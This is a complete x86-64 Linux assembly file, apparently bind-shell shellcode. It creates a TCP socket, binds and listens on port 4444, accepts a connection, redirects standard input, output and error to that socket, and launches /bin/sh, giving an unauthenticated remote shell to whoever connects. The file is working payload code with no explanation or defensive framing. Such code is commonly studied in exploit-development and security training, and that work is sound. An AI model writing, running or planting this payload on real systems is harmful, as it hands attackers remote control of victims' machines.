bits 64
section .text
global _start

_start:
	
	; socket(AF_INET, SOCK_STREAM, 0)
	; (2, 1, 0)

	xor rdx, rdx
	lea rsi, [rdx + 1]
	lea rdi, [rdx + 2]

	push 0x29
	pop rax ; SYS_socket

	syscall

	mov r8, rax

	; bind(sockfd, &saddr, 0x10)
	
	xchg rdi, rax

	push rdx
	push word 0x5c11
	push ax

	mov rsi, rsp
	mov dl, 0x10

	mov al, 0x31 ; SYS_bind

	syscall

	; listen(sockfd, 0x10)

	mov rsi, rdx
	
	mov al, 0x32 ; SYS_listen

	syscall

	; accept(sockfd, NULL, NULL)
	
	xor rsi, rsi

	mov al, 0x2b ; SYS_accept

	syscall

	mov r9, rax

	; dup2(clientfd, [0,1,2])

	mov rdi, r9
	mov sil, 2
	duplicate:
		mov al, 33 ; SYS_dup2
		syscall
		dec sil
		jns duplicate

	; execve("/bin/sh", NULL, NULL)

	xchg rdx, rax
	xor rsi, rsi

	push rsi

	mov rdi, 0x68732f2f6e69622f ; /bin//sh
	push rdi
	mov rdi, rsp

	mov al, 0x3b ; SYS_execve
	syscall